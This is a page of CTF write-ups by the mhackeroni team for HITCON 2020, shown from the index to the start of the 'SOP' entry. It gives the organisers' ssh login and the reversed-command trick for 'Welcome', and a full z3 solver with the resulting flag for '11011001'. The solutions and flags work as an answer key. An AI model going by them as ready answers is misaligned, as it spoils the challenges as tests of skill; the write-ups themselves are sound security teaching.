<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>HITCON 2020 - Write ups &#183; mhackeroni</title><meta name=title content="HITCON 2020 - Write ups &#183; mhackeroni"><meta name=description content="Collection of writeups for HITCON 2020 by the mhackeroni team."><meta name=keywords content="hitcon,ctf,mhackeroni,writeups,"><link rel=canonical href=https://mhackeroni.it/writeups/2020-12-05-hitcon2020-all-writeups/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1d8c7618f0ef6623fd6ebffc2988f58f128a919c43d2ed5d99a0621768c50d3ec37bd1e02b3eb119ba92bc64d53422281addaaa107a57202376dbd6a14e2e50e.css integrity="sha512-HYx2GPDvZiP9br/8KYj1jxKKkZxD0u1dmaBiF2jFDT7De9HgKz6xGbqSvGTVNCIoGt2qoQelcgI3bb1qFOLlDg=="><script type=text/javascript src=/js/appearance.min.2a7f28406ff67c2e3fedcfa49ff1dc78cca5f4b2ace4618a279f94d3fd241566af610abcf38bb98ec3f039afc0acbb3c27e9eced17e4a072f1a98e18a628ec7e.js integrity="sha512-Kn8oQG/2fC4/7c+kn/HceMyl9LKs5GGKJ5+U0/0kFWavYQq884u5jsPwOa/ArLs8J+ns7RfkoHLxqY4Ypijsfg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://mhackeroni.it/writeups/2020-12-05-hitcon2020-all-writeups/"><meta property="og:site_name" content="mhackeroni"><meta property="og:title" content="HITCON 2020 - Write ups"><meta property="og:description" content="Collection of writeups for HITCON 2020 by the mhackeroni team."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-12-05T00:00:00+00:00"><meta property="article:modified_time" content="2020-12-05T00:00:00+00:00"><meta property="article:tag" content="Hitcon"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Mhackeroni"><meta property="article:tag" content="Writeups"><meta name=twitter:card content="summary"><meta name=twitter:title content="HITCON 2020 - Write ups"><meta name=twitter:description content="Collection of writeups for HITCON 2020 by the mhackeroni team."><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"HITCON 2020 - Write ups","headline":"HITCON 2020 - Write ups","description":"Collection of writeups for HITCON 2020 by the mhackeroni team.","inLanguage":"en","url":"https:\/\/mhackeroni.it\/writeups\/2020-12-05-hitcon2020-all-writeups\/","author":{"@type":"Person","name":"mhackeroni"},"copyrightYear":"2020","dateCreated":"2020-12-05T00:00:00\u002b00:00","datePublished":"2020-12-05T00:00:00\u002b00:00","dateModified":"2020-12-05T00:00:00\u002b00:00","keywords":["hitcon","ctf","mhackeroni","writeups"],"mainEntityOfPage":"true","wordCount":"14509"}]</script><meta name=author content="mhackeroni"><link href=https://bsky.app/profile/mhackeroni.bsky.social rel=me><link href=https://www.facebook.com/mhackeroni rel=me><link href=https://github.com/mhackeroni/ rel=me><link href=https://www.linkedin.com/company/mhackeroni-inc/ rel=me><link href=https://x.com/mhackeroni rel=me><link href=https://www.youtube.com/@mhackeroni rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>mhackeroni</span>
<img src=/mhackeroni-stylized-square.webp width=1024 height=1024 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=mhackeroni></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mhackeroni</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>News</p></a><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Writeups</p></a><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Sponsors>Sponsors</p></a><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="ðŸ“·  Photo Gallery">Gallery</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>News</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Writeups</p></a></li><li class=mt-1><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Sponsors>Sponsors</p></a></li><li class=mt-1><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="ðŸ“·  Photo Gallery">Gallery</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">HITCON 2020 - Write ups</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2020-12-05T00:00:00+00:00>5 December 2020</time><span class="px-2 text-primary-500">&#183;</span><span>14509 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">69 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>This is the collection of writeups for HITCON 2020 by the mhackeroni team.</p><h2 class="relative group">Index<div id=index class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#index aria-label=Anchor>#</a></span></h2><ul><li><a href=#welcome>Welcome</a> - rev, 50pts, 715 solves</li><li><a href=#11011001>11011001</a> - rev, 255pts, 30 solves</li><li><a href=#sop>SOP</a> - rev, 305pts, 15 solves</li><li><a href=#run-run-run>Run Run Run</a> - rev, 315pts, 13 solves</li><li><a href=#lobscurit%c3%a9>L&rsquo;ObscuritÃ©</a> - rev, 500pts, 1 solve</li><li><a href=#dual>Dual</a> - pwn, 288pts, 19 solves</li><li><a href=#spark>Spark</a> - pwn, 344pts, 10 solves</li><li><a href=#telescope>Telescope</a> - pwn, 384pts, 5 solves</li><li><a href=#100-pins>100 pins</a> - crypto, 350pts, 8 solves</li><li><a href=#ac1750>AC1750</a> - forensics, 168pts, 100 solves</li><li><a href=#baby-shock>Baby Shock</a> - misc, 201pts</li><li><a href=#revenge-of-baby-shock>Revenge of Baby Shock</a> - misc, 230pts, 42 solves</li><li><a href=#revenge-of-pwn>Revenge of Pwn</a> - misc/pwn, 255pts, 30 solves</li><li><a href=#atoms>Atoms</a> - misc/pwn, 296pts, 17 solves</li><li><a href=#tenet>Tenet</a> - misc/shellcode - 222pts, 47 solves</li></ul><h4 class="relative group"><a href=#disqus_thread>Comments section</a><div id=comments-section class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#comments-section aria-label=Anchor>#</a></span></h4><h2 class="relative group">Welcome<div id=welcome class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#welcome aria-label=Anchor>#</a></span></h2><blockquote><p>It&rsquo;s a reverse challenge.</p><p><code>ssh welcome@18.176.232.130 password: hitconctf</code></p></blockquote><h3 class="relative group">The challenge<div id=the-challenge class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge aria-label=Anchor>#</a></span></h3><p>The challenge is literally a reverse challenge. Every word in input is reversed:</p><p>If we run <code>cat flag</code> we get:</p><pre tabindex=0><code>tac: failed to open &#39;galf&#39; for reading: No such file or directory
</code></pre><h3 class="relative group">The solution<div id=the-solution class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-solution aria-label=Anchor>#</a></span></h3><p>If we run <code>tac galf</code> we get <code>hitcon{!0202 ftcnoctih ot emoclew}</code>, which is the
flag.</p><h2 class="relative group">11011001<div id=11011001 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#11011001 aria-label=Anchor>#</a></span></h2><blockquote><p>010011100110111100100000011010000110100101101110011101000010000001101000
011001010111001001100101001011000010000001110111011010000110000101110100
001000000110000101110010011001010010000001111001011011110111010100100000
011001010111100001110000011001010110001101110100011010010110111001100111
0010000001100110011011110111001000111111</p></blockquote><h3 class="relative group">The challenge<div id=the-challenge-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-1 aria-label=Anchor>#</a></span></h3><p>We are given a C++ binary, which seems heavily optimized and decompiles like a
mess. The binary wants 20 unsigned 32-bit integers as inputs and performs some
checks on them. If those checks pass, a SHA26 hash is computed and printed as
part of the flag.</p><p>The checks are kind of annoying to reverse-engineer, but in the end are pretty
straightforward:</p><ol><li>Each number must be between <code>0</code> and <code>0xFFFFF</code>.</li><li>There is a global table of 40 hardcoded values: each i-th input is and-ed
(binary and) with the value at <code>table[2*i]</code> and the result must be equal to
the value at <code>table[2*i+1]</code>.</li><li>Eeach number cannot contain three consecutive equal bits.</li><li>There cannot be three equal bits at the same position in three consecutive
numbers.</li><li>Each number must have exactly 10 bits set to <code>1</code>.</li><li>The total number of <code>1</code> bits at any given position in all numbers must be
exactly 10.</li></ol><p>There are also other checks made by the program, but we did not get reverse
those, because in the meantime we we were writing a simple Python solver using
<a href=https://pypi.org/project/z3-solver/ target=_blank><code>z3</code></a>, adding one check at the time and
testing the result. After the 6th check above, our input got accepted by the
program and it spit out the flag.</p><h3 class="relative group">The solution<div id=the-solution-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-solution-1 aria-label=Anchor>#</a></span></h3><p>Complete solution:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1># @dp_1, @mebeim - 2020-11-29</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>z3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>table</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x81002</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x29065</span><span class=p>,</span> <span class=mh>0x29061</span><span class=p>,</span> <span class=mh>0x2</span><span class=p>,</span> <span class=mh>0x2</span><span class=p>,</span> <span class=mh>0x16C40</span><span class=p>,</span> <span class=mh>0x16C00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		 <span class=mh>0x20905</span><span class=p>,</span> <span class=mh>0x805</span><span class=p>,</span> <span class=mh>0x10220</span><span class=p>,</span> <span class=mh>0x220</span><span class=p>,</span> <span class=mh>0x98868</span><span class=p>,</span> <span class=mh>0x80860</span><span class=p>,</span> <span class=mh>0x21102</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		 <span class=mh>0x21000</span><span class=p>,</span> <span class=mh>0x491</span><span class=p>,</span> <span class=mh>0x481</span><span class=p>,</span> <span class=mh>0x31140</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x801</span><span class=p>,</span> <span class=mh>0x0</span><span class=p>,</span> <span class=mh>0x60405</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		 <span class=mh>0x400</span><span class=p>,</span> <span class=mh>0x0C860</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x508</span><span class=p>,</span> <span class=mh>0x400</span><span class=p>,</span> <span class=mh>0x40900</span><span class=p>,</span> <span class=mh>0x800</span><span class=p>,</span> <span class=mh>0x12213</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		 <span class=mh>0x10003</span><span class=p>,</span> <span class=mh>0x428C0</span><span class=p>,</span> <span class=mh>0x840</span><span class=p>,</span> <span class=mh>0x840C</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x43500</span><span class=p>,</span> <span class=mh>0x2000</span><span class=p>,</span> <span class=mh>0x8105A</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		 <span class=mh>0x1000</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>popcount</span><span class=p>(</span><span class=n>v</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>	Bit Twiddling Hacks FTW
</span></span></span><span class=line><span class=cl><span class=s1>	https://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetParallel
</span></span></span><span class=line><span class=cl><span class=s1>	&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>	<span class=n>w</span> <span class=o>=</span> <span class=n>v</span> <span class=o>-</span> <span class=p>((</span><span class=n>v</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x55555555</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>q</span> <span class=o>=</span> <span class=p>(</span><span class=n>w</span> <span class=o>&amp;</span> <span class=mh>0x33333333</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>w</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x33333333</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>s</span> <span class=o>=</span> <span class=p>((</span><span class=n>q</span> <span class=o>+</span> <span class=p>(</span><span class=n>q</span> <span class=o>&gt;&gt;</span> <span class=mi>4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF0F0F0F</span><span class=p>)</span> <span class=o>*</span> <span class=mh>0x1010101</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>solver</span> <span class=o>=</span> <span class=n>z3</span><span class=o>.</span><span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>inp</span> <span class=o>=</span> <span class=p>[</span><span class=n>z3</span><span class=o>.</span><span class=n>BitVec</span><span class=p>(</span><span class=s1>&#39;x</span><span class=si>{:02d}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>),</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>inp</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFFF00000</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>x</span> <span class=o>&amp;</span> <span class=n>table</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>table</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>mask</span> <span class=o>=</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>18</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>((</span><span class=n>x</span> <span class=o>&amp;</span> <span class=n>mask</span><span class=p>)</span> <span class=o>!=</span> <span class=p>(</span><span class=mi>7</span><span class=o>&lt;&lt;</span><span class=n>j</span><span class=p>),</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=n>mask</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>mask</span> <span class=o>=</span> <span class=n>mask</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>off</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>inp</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>x</span> <span class=o>=</span> <span class=p>((</span><span class=n>inp</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>&gt;&gt;</span><span class=n>off</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>inp</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>&gt;&gt;</span><span class=n>off</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=p>((</span><span class=n>inp</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span><span class=o>&gt;&gt;</span><span class=n>off</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>x</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>x</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>inp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>popcount</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>off</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>inp</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=n>off</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>inp</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>		<span class=n>x</span> <span class=o>+=</span> <span class=p>(</span><span class=n>inp</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=n>off</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>	<span class=n>solver</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>x</span> <span class=o>==</span> <span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>solver</span><span class=o>.</span><span class=n>check</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>res</span> <span class=o>==</span> <span class=n>z3</span><span class=o>.</span><span class=n>sat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=n>solver</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>nums</span> <span class=o>=</span> <span class=p>[</span><span class=n>m</span><span class=p>[</span><span class=n>x</span><span class=p>]</span><span class=o>.</span><span class=n>as_long</span><span class=p>()</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>inp</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=o>*</span><span class=n>nums</span><span class=p>)</span>
</span></span></code></pre></div><p>And here it is in action:</p><pre tabindex=0><code>$ ./solve.py | ./11011001
Congratulations!
Here&#39;s your gift: hitcon{fd05b10812d764abd7d853dfd24dbe6769a701eecae079e7d26570effc03e08d}
</code></pre><h2 class="relative group">SOP<div id=sop class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#sop aria-label=Anchor>#</a></span></h2><blockquote><p>Let me introduce a brand new concept - Syscall Oriented Programming!</p></blockquote><p>The binary implements the typical fetch-execute loop in the <code>run</code> function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>memset</span><span class=p>(</span><span class=n>regs</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>regs</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span> <span class=n>code</span><span class=p>[</span><span class=n>regs</span><span class=p>[</span><span class=mi>15</span><span class=p>]]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>fetch_inst</span><span class=p>(</span><span class=n>code</span><span class=p>[</span><span class=n>regs</span><span class=p>[</span><span class=mi>15</span><span class=p>]],</span> <span class=o>&amp;</span><span class=n>sysno</span><span class=p>,</span> <span class=n>sysargs</span><span class=p>,</span> <span class=n>regs</span><span class=p>);</span>
